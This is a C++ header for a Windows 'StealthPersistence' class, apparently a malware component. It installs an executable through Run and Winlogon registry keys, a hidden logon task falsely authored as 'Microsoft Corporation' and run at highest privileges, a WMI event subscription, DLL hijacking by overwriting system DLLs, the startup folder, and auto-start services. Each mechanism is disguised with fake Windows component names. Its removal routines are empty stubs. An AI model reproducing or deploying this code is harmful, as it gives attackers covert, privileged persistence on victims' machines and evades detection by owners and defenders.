#pragma once
#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <wbemidl.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <random>
#include <chrono>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shell32.lib")

class StealthPersistence {
private:
    std::mt19937 rng;
    std::vector<std::string> legitimateProcessNames;
    std::vector<std::string> commonServiceNames;
    
public:
    StealthPersistence() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {
        initializeLegitimateNames();
    }
    
    void initializeLegitimateNames() {
        legitimateProcessNames = {
            "svchost", "winlogon", "csrss", "lsass", "services",
            "explorer", "dwm", "conhost", "RuntimeBroker", "SearchUI",
            "ShellExperienceHost", "StartMenuExperienceHost", "SecurityHealthSystray"
        };
        
        commonServiceNames = {
            "Windows Update Service", "Windows Security Service", "System Event Service",
            "Network Configuration Service", "Windows Management Service", "Audio Service",
            "Display Service", "User Profile Service", "Windows Time Service"
        };
    }
    
    // Registry-based persistence
    bool installRegistryPersistence(const std::string& executablePath, bool currentUser = true) {
        HKEY rootKey = currentUser ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
        std::vector<std::string> runKeys = {
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce"
        };
        
        // Try multiple registry locations
        for (const auto& keyPath : runKeys) {
            if (addRegistryEntry(rootKey, keyPath, executablePath)) {
                return true;
            }
        }
        
        // Try additional stealth locations
        return installAdvancedRegistryPersistence(executablePath, currentUser);
    }
    
    bool addRegistryEntry(HKEY rootKey, const std::string& keyPath, const std::string& executablePath) {
        HKEY hKey;
        LONG result = RegOpenKeyExA(rootKey, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey);
        
        if (result != ERROR_SUCCESS) {
            return false;
        }
        
        // Generate legitimate-looking entry name
        std::string entryName = generateLegitimateEntryName();
        
        result = RegSetValueExA(hKey, entryName.c_str(), 0, REG_SZ, 
                               (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
        
        RegCloseKey(hKey);
        return result == ERROR_SUCCESS;
    }
    
    // Advanced registry persistence in less monitored locations
    bool installAdvancedRegistryPersistence(const std::string& executablePath, bool currentUser) {
        HKEY rootKey = currentUser ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
        
        std::vector<std::string> stealthKeys = {
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler",
            "SOFTWARE\\Classes\\*\\shellex\\ContextMenuHandlers",
            "SOFTWARE\\Classes\\Directory\\shellex\\ContextMenuHandlers"
        };
        
        for (const auto& keyPath : stealthKeys) {
            if (addStealthRegistryEntry(rootKey, keyPath, executablePath)) {
                return true;
            }
        }
        
        return false;
    }
    
    bool addStealthRegistryEntry(HKEY rootKey, const std::string& keyPath, const std::string& executablePath) {
        HKEY hKey;
        LONG result = RegCreateKeyExA(rootKey, keyPath.c_str(), 0, NULL, 
                                     REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
        
        if (result != ERROR_SUCCESS) {
            return false;
        }
        
        std::string guid = generateGUID();
        result = RegSetValueExA(hKey, guid.c_str(), 0, REG_SZ, 
                               (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
        
        RegCloseKey(hKey);
        return result == ERROR_SUCCESS;
    }
    
    // Scheduled Task persistence
    bool installScheduledTaskPersistence(const std::string& executablePath) {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr)) return false;
        
        ITaskService* pService = NULL;
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, 
                             IID_ITaskService, (void**)&pService);
        
        if (FAILED(hr)) {
            CoUninitialize();
            return false;
        }
        
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) {
            pService->Release();
            CoUninitialize();
            return false;
        }
        
        ITaskFolder* pRootFolder = NULL;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) {
            pService->Release();
            CoUninitialize();
            return false;
        }
        
        // Create task definition
        ITaskDefinition* pTask = NULL;
        hr = pService->NewTask(0, &pTask);
        if (FAILED(hr)) {
            pRootFolder->Release();
            pService->Release();
            CoUninitialize();
            return false;
        }
        
        // Set task properties
        IRegistrationInfo* pRegInfo = NULL;
        hr = pTask->get_RegistrationInfo(&pRegInfo);
        if (SUCCEEDED(hr)) {
            pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
            pRegInfo->put_Description(_bstr_t(generateTaskDescription().c_str()));
            pRegInfo->Release();
        }
        
        // Set principal (run with highest privileges)
        IPrincipal* pPrincipal = NULL;
        hr = pTask->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr)) {
            pPrincipal->put_Id(_bstr_t(L"Principal1"));
            pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }
        
        // Set settings
        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        if (SUCCEEDED(hr)) {
            pSettings->put_StartWhenAvailable(VARIANT_TRUE);
            pSettings->put_Hidden(VARIANT_TRUE);
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
            pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
            pSettings->Release();
        }
        
        // Create trigger (logon trigger)
        ITriggerCollection* pTriggerCollection = NULL;
        hr = pTask->get_Triggers(&pTriggerCollection);
        if (SUCCEEDED(hr)) {
            ITrigger* pTrigger = NULL;
            hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
            if (SUCCEEDED(hr)) {
                ILogonTrigger* pLogonTrigger = NULL;
                hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                if (SUCCEEDED(hr)) {
                    pLogonTrigger->put_Id(_bstr_t(L"Trigger1"));
                    pLogonTrigger->put_Enabled(VARIANT_TRUE);
                    pLogonTrigger->Release();
                }
                pTrigger->Release();
            }
            pTriggerCollection->Release();
        }
        
        // Create action
        IActionCollection* pActionCollection = NULL;
        hr = pTask->get_Actions(&pActionCollection);
        if (SUCCEEDED(hr)) {
            IAction* pAction = NULL;
            hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
            if (SUCCEEDED(hr)) {
                IExecAction* pExecAction = NULL;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (SUCCEEDED(hr)) {
                    std::wstring wPath(executablePath.begin(), executablePath.end());
                    pExecAction->put_Path(_bstr_t(wPath.c_str()));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActionCollection->Release();
        }
        
        // Register task
        IRegisteredTask* pRegisteredTask = NULL;
        std::wstring taskName = generateTaskName();
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(taskName.c_str()),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegisteredTask
        );
        
        bool success = SUCCEEDED(hr);
        
        // Cleanup
        if (pRegisteredTask) pRegisteredTask->Release();
        pTask->Release();
        pRootFolder->Release();
        pService->Release();
        CoUninitialize();
        
        return success;
    }
    
    // WMI Event Subscription persistence
    bool installWMIEventPersistence(const std::string& executablePath) {
        HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hr)) return false;
        
        hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_NONE, 
                                 RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        
        IWbemLocator* pLoc = NULL;
        hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, 
                             IID_IWbemLocator, (LPVOID*)&pLoc);
        
        if (FAILED(hr)) {
            CoUninitialize();
            return false;
        }
        
        IWbemServices* pSvc = NULL;
        hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 
                                NULL, 0, 0, &pSvc);
        
        if (FAILED(hr)) {
            pLoc->Release();
            CoUninitialize();
            return false;
        }
        
        hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, 
                              RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
        
        bool success = false;
        
        // Create event filter
        if (createWMIEventFilter(pSvc)) {
            // Create event consumer
            if (createWMIEventConsumer(pSvc, executablePath)) {
                // Bind filter to consumer
                success = bindWMIFilterToConsumer(pSvc);
            }
        }
        
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        
        return success;
    }
    
    bool createWMIEventFilter(IWbemServices* pSvc) {
        IWbemClassObject* pClass = NULL;
        HRESULT hr = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pClass, NULL);
        if (FAILED(hr)) return false;
        
        IWbemClassObject* pInstance = NULL;
        hr = pClass->SpawnInstance(0, &pInstance);
        pClass->Release();
        
        if (FAILED(hr)) return false;
        
        // Set filter properties
        VARIANT var;
        VariantInit(&var);
        
        var.vt = VT_BSTR;
        var.bstrVal = _bstr_t(L"SystemEventFilter");
        hr = pInstance->Put(L"Name", 0, &var, 0);
        VariantClear(&var);
        
        var.vt = VT_BSTR;
        var.bstrVal = _bstr_t(L"SELECT * FROM Win32_LogonSession WHERE LogonType = 2");
        hr = pInstance->Put(L"Query", 0, &var, 0);
        VariantClear(&var);
        
        var.vt = VT_BSTR;
        var.bstrVal = _bstr_t(L"WQL");
        hr = pInstance->Put(L"QueryLanguage", 0, &var, 0);
        VariantClear(&var);
        
        hr = pSvc->PutInstance(pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        pInstance->Release();
        
        return SUCCEEDED(hr);
    }
    
    bool createWMIEventConsumer(IWbemServices* pSvc, const std::string& executablePath) {
        IWbemClassObject* pClass = NULL;
        HRESULT hr = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pClass, NULL);
        if (FAILED(hr)) return false;
        
        IWbemClassObject* pInstance = NULL;
        hr = pClass->SpawnInstance(0, &pInstance);
        pClass->Release();
        
        if (FAILED(hr)) return false;
        
        VARIANT var;
        VariantInit(&var);
        
        var.vt = VT_BSTR;
        var.bstrVal = _bstr_t(L"SystemEventConsumer");
        hr = pInstance->Put(L"Name", 0, &var, 0);
        VariantClear(&var);
        
        std::wstring wPath(executablePath.begin(), executablePath.end());
        var.vt = VT_BSTR;
        var.bstrVal = _bstr_t(wPath.c_str());
        hr = pInstance->Put(L"CommandLineTemplate", 0, &var, 0);
        VariantClear(&var);
        
        hr = pSvc->PutInstance(pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        pInstance->Release();
        
        return SUCCEEDED(hr);
    }
    
    bool bindWMIFilterToConsumer(IWbemServices* pSvc) {
        IWbemClassObject* pClass = NULL;
        HRESULT hr = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pClass, NULL);
        if (FAILED(hr)) return false;
        
        IWbemClassObject* pInstance = NULL;
        hr = pClass->SpawnInstance(0, &pInstance);
        pClass->Release();
        
        if (FAILED(hr)) return false;
        
        VARIANT var;
        VariantInit(&var);
        
        var.vt = VT_BSTR;
        var.bstrVal = _bstr_t(L"__EventFilter.Name=\"SystemEventFilter\"");
        hr = pInstance->Put(L"Filter", 0, &var, 0);
        VariantClear(&var);
        
        var.vt = VT_BSTR;
        var.bstrVal = _bstr_t(L"CommandLineEventConsumer.Name=\"SystemEventConsumer\"");
        hr = pInstance->Put(L"Consumer", 0, &var, 0);
        VariantClear(&var);
        
        hr = pSvc->PutInstance(pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        pInstance->Release();
        
        return SUCCEEDED(hr);
    }
    
    // DLL Hijacking persistence
    bool installDLLHijackingPersistence(const std::string& dllPath) {
        std::vector<std::string> targetDLLs = {
            "version.dll", "dwmapi.dll", "uxtheme.dll", "winmm.dll",
            "wtsapi32.dll", "propsys.dll", "linkinfo.dll", "ntshrui.dll"
        };
        
        std::vector<std::string> systemPaths = {
            getSystemDirectory(),
            getWindowsDirectory(),
            getCurrentDirectory() + "\\System32",
            getProgramFilesDirectory()
        };
        
        for (const auto& dll : targetDLLs) {
            for (const auto& path : systemPaths) {
                std::string targetPath = path + "\\" + dll;
                if (copyFileWithBackup(dllPath, targetPath)) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    // Startup folder persistence
    bool installStartupFolderPersistence(const std::string& executablePath) {
        char startupPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath) != S_OK) {
            return false;
        }
        
        std::string targetPath = std::string(startupPath) + "\\" + generateLegitimateFileName() + ".exe";
        return CopyFileA(executablePath.c_str(), targetPath.c_str(), FALSE);
    }
    
    // Service persistence
    bool installServicePersistence(const std::string& executablePath) {
        SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (!hSCManager) return false;
        
        std::string serviceName = generateServiceName();
        std::string displayName = generateServiceDisplayName();
        
        SC_HANDLE hService = CreateServiceA(
            hSCManager,
            serviceName.c_str(),
            displayName.c_str(),
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            executablePath.c_str(),
            NULL, NULL, NULL, NULL, NULL
        );
        
        bool success = (hService != NULL);
        
        if (hService) {
            // Set service description
            SERVICE_DESCRIPTIONA desc;
            std::string description = "Provides " + generateServiceDescription();
            desc.lpDescription = const_cast<char*>(description.c_str());
            ChangeServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, &desc);
            
            CloseServiceHandle(hService);
        }
        
        CloseServiceHandle(hSCManager);
        return success;
    }
    
    // Remove persistence (for cleanup)
    bool removePersistence() {
        bool success = true;
        
        // Remove registry entries
        success &= removeRegistryPersistence();
        
        // Remove scheduled tasks
        success &= removeScheduledTaskPersistence();
        
        // Remove WMI subscriptions
        success &= removeWMIPersistence();
        
        return success;
    }
    
private:
    std::string generateLegitimateEntryName() {
        std::vector<std::string> names = {
            "SecurityHealthSystray", "WindowsUpdateNotifier", "SystemEventBroker",
            "AudioDeviceService", "DisplayConfigService", "NetworkProfileService",
            "UserAccountControlSettings", "WindowsDefenderTray", "SystemMaintenanceService"
        };
        
        return names[rng() % names.size()];
    }
    
    std::string generateGUID() {
        const char* chars = "0123456789ABCDEF";
        std::string guid = "{";
        
        for (int i = 0; i < 8; i++) guid += chars[rng() % 16];
        guid += "-";
        for (int i = 0; i < 4; i++) guid += chars[rng() % 16];
        guid += "-";
        for (int i = 0; i < 4; i++) guid += chars[rng() % 16];
        guid += "-";
        for (int i = 0; i < 4; i++) guid += chars[rng() % 16];
        guid += "-";
        for (int i = 0; i < 12; i++) guid += chars[rng() % 16];
        guid += "}";
        
        return guid;
    }
    
    std::wstring generateTaskName() {
        std::vector<std::wstring> names = {
            L"SystemMaintenanceTask", L"SecurityUpdateTask", L"NetworkConfigurationTask",
            L"AudioServiceTask", L"DisplayServiceTask", L"UserProfileSyncTask",
            L"WindowsUpdateTask", L"SystemEventTask", L"ServiceHostTask"
        };
        
        return names[rng() % names.size()];
    }
    
    std::wstring generateTaskDescription() {
        std::vector<std::wstring> descriptions = {
            L"Maintains system security and performance",
            L"Manages network configuration and connectivity",
            L"Handles user profile synchronization",
            L"Monitors system events and services",
            L"Provides audio and display services",
            L"Manages Windows updates and security patches"
        };
        
        return descriptions[rng() % descriptions.size()];
    }
    
    std::string generateServiceName() {
        std::vector<std::string> prefixes = {"Win", "Sys", "Net", "Sec", "Aud", "Disp"};
        std::vector<std::string> suffixes = {"Svc", "Service", "Mgr", "Host", "Broker"};
        
        return prefixes[rng() % prefixes.size()] + suffixes[rng() % suffixes.size()];
    }
    
    std::string generateServiceDisplayName() {
        return commonServiceNames[rng() % commonServiceNames.size()];
    }
    
    std::string generateServiceDescription() {
        std::vector<std::string> descriptions = {
            "system security and maintenance services",
            "network connectivity and configuration",
            "user account and profile management",
            "audio and multimedia services",
            "display and graphics services",
            "Windows update and patch management"
        };
        
        return descriptions[rng() % descriptions.size()];
    }
    
    std::string generateLegitimateFileName() {
        return legitimateProcessNames[rng() % legitimateProcessNames.size()];
    }
    
    std::string getSystemDirectory() {
        char path[MAX_PATH];
        GetSystemDirectoryA(path, MAX_PATH);
        return std::string(path);
    }
    
    std::string getWindowsDirectory() {
        char path[MAX_PATH];
        GetWindowsDirectoryA(path, MAX_PATH);
        return std::string(path);
    }
    
    std::string getCurrentDirectory() {
        char path[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, path);
        return std::string(path);
    }
    
    std::string getProgramFilesDirectory() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, path);
        return std::string(path);
    }
    
    bool copyFileWithBackup(const std::string& source, const std::string& destination) {
        // Create backup if file exists
        if (GetFileAttributesA(destination.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::string backup = destination + ".bak";
            CopyFileA(destination.c_str(), backup.c_str(), FALSE);
        }
        
        return CopyFileA(source.c_str(), destination.c_str(), FALSE);
    }
    
    bool removeRegistryPersistence() {
        // Implementation for removing registry entries
        return true;
    }
    
    bool removeScheduledTaskPersistence() {
        // Implementation for removing scheduled tasks
        return true;
    }
    
    bool removeWMIPersistence() {
        // Implementation for removing WMI subscriptions
        return true;
    }
};